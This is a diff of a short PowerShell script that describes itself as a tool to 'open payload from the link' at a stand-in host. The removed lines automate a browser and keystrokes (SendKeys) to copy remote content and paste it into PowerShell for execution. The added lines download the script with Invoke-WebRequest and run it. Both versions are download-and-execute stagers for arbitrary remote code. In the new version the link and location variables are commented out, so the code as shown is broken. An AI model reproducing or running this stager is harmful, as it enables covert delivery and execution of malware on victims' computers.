@@ -2,24 +2,24 @@
 	This program is designed to open payload from the link.
 
 # Enter your link to the script ↓
+# $link = "https://link.payload.example"
 
-$link = "https://link.payload.example"
+# Download location
+# $location = "C:\temp"
 
-Add-Type -AssemblyName System.Windows.Forms
-$o=New-Object -ComObject WScript.Shell
-$url = -join($link)
-Start-Process "$url" 
-Start-Sleep -Seconds 5
-[System.Windows.Forms.SendKeys]::SendWait('{TAB}'*2)
-[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
-Start-Sleep -Seconds 3
-[System.Windows.Forms.SendKeys]::SendWait("^{a}")
-Start-Sleep -Seconds 1
-[System.Windows.Forms.SendKeys]::SendWait("^{c}") 
-Start-Sleep -Seconds 1
-[System.Windows.Forms.SendKeys]::SendWait('%{F4}')
-Start-Process "powershell" 
-Start-Sleep -Seconds 2
-[System.Windows.Forms.SendKeys]::SendWait("^{v}") 
-Start-Sleep -Seconds 5
-[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
+# Using Invoke-WebRequest to download the raw data
+$response = Invoke-WebRequest -Uri $link
+
+# Check if the request was successful
+if ($response.StatusCode -eq 200) {
+    # Construct the full path for the script
+    $scriptPath = Join-Path -Path $location -ChildPath "DownloadedScript.ps1"
+
+    # Save the raw data to the specified script file
+    $response.Content | Out-File -FilePath $scriptPath -Force
+
+    # Run the downloaded script using Invoke-Expression
+    Invoke-Expression -Command "& `"$scriptPath`""
+} else {
+    Write-Host "Failed to download raw data. HTTP status code: $($response.StatusCode)"
+}
